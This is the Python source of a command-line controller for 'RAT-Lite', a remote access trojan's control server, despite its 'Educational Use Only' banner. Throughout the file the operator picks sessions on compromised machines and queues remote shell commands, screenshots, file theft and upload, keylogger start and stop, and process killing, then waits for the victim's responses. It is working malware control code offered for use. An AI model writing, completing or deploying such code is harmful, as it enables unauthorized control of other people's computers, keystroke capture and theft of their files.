#!/usr/bin/env python3
"""
CLI Controller for RAT-Lite Server
Alternative to web panel - terminal-based control
"""

import asyncio
import json
import sys
from session_manager import SessionManager
from command_handler import CommandHandler


class CLIController:
    def __init__(self, session_manager: SessionManager, command_handler: CommandHandler):
        self.sessions = session_manager
        self.commands = command_handler
        self.current_session = None
        
    def print_banner(self):
        print("""
╔═══════════════════════════════════════╗
║     RAT-Lite CLI Controller         ║
║     Educational Use Only              ║
╚═══════════════════════════════════════╝
        """)
        
    def print_help(self):
        print("""
Commands:
  sessions              - List active sessions
  use <session_id>      - Select session
  info                  - Show session info
  shell <command>       - Execute shell command
  screenshot            - Capture screenshot
  download <path>       - Download file
  upload <local> <remote> - Upload file
  keylog_start          - Start keylogger
  keylog_stop           - Stop keylogger
  processes             - List processes
  kill <pid>            - Kill process
  cd <path>             - Change directory
  ls [path]             - List directory
  pwd                   - Print working directory
  exit                  - Close session
  help                  - Show this help
  quit                  - Exit controller
        """)
    
    async def run(self):
        self.print_banner()
        
        while True:
            try:
                prompt = f"[{self.current_session or 'none'}]> "
                cmd_line = input(prompt).strip()
                
                if not cmd_line:
                    continue
                    
                parts = cmd_line.split()
                cmd = parts[0].lower()
                args = parts[1:]
                
                if cmd == 'quit':
                    break
                elif cmd == 'help':
                    self.print_help()
                elif cmd == 'sessions':
                    await self._list_sessions()
                elif cmd == 'use':
                    self._use_session(args[0] if args else None)
                elif cmd == 'info':
                    await self._session_info()
                elif cmd in ['shell', 'screenshot', 'download', 'upload', 
                            'keylog_start', 'keylog_stop', 'processes', 
                            'kill', 'cd', 'ls', 'pwd', 'exit']:
                    await self._send_command(cmd, args)
                else:
                    print(f"Unknown command: {cmd}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
    
    async def _list_sessions(self):
        sessions = self.sessions.list_sessions()
        if not sessions:
            print("No active sessions")
            return
        for s in sessions:
            print(f"  [{s['id']}] {s['addr'][0]}:{s['addr'][1]} - {s['status']}")
    
    def _use_session(self, session_id):
        if not session_id:
            print("Usage: use <session_id>")
            return
        session = self.sessions.get_session(session_id)
        if session:
            self.current_session = session_id
            print(f"Selected session: {session_id}")
        else:
            print(f"Session not found: {session_id}")
    
    async def _session_info(self):
        if not self.current_session:
            print("No session selected")
            return
        session = self.sessions.get_session(self.current_session)
        print(json.dumps(session['system_info'], indent=2))
    
    async def _send_command(self, cmd_type, args):
        if not self.current_session:
            print("No session selected. Use 'sessions' and 'use <id>' first")
            return
        
        # Build args dict based on command type
        arg_dict = {}
        if cmd_type == 'shell' and args:
            arg_dict['command'] = ' '.join(args)
        elif cmd_type == 'download' and args:
            arg_dict['remote_path'] = args[0]
        elif cmd_type == 'upload' and len(args) >= 2:
            arg_dict['local_path'] = args[0]
            arg_dict['remote_path'] = args[1]
        elif cmd_type == 'kill' and args:
            arg_dict['pid'] = int(args[0])
        elif cmd_type == 'cd' and args:
            arg_dict['path'] = args[0]
        elif cmd_type == 'ls' and args:
            arg_dict['path'] = args[0]
        
        cmd = self.commands.create_command(cmd_type, **arg_dict)
        await self.sessions.queue_command(self.current_session, cmd)
        print(f"[+] Command queued: {cmd['id']}")
        
        # Wait for response
        print("[*] Waiting for response...")
        for _ in range(30):
            await asyncio.sleep(1)
            response = self.sessions.get_response(self.current_session, cmd['id'])
            if response:
                print(f"\n[Response]\n{response['data']}")
                return
        print("[-] Timeout waiting for response")


# Standalone usage
if __name__ == '__main__':
    print("This is a module. Import and use with running server.")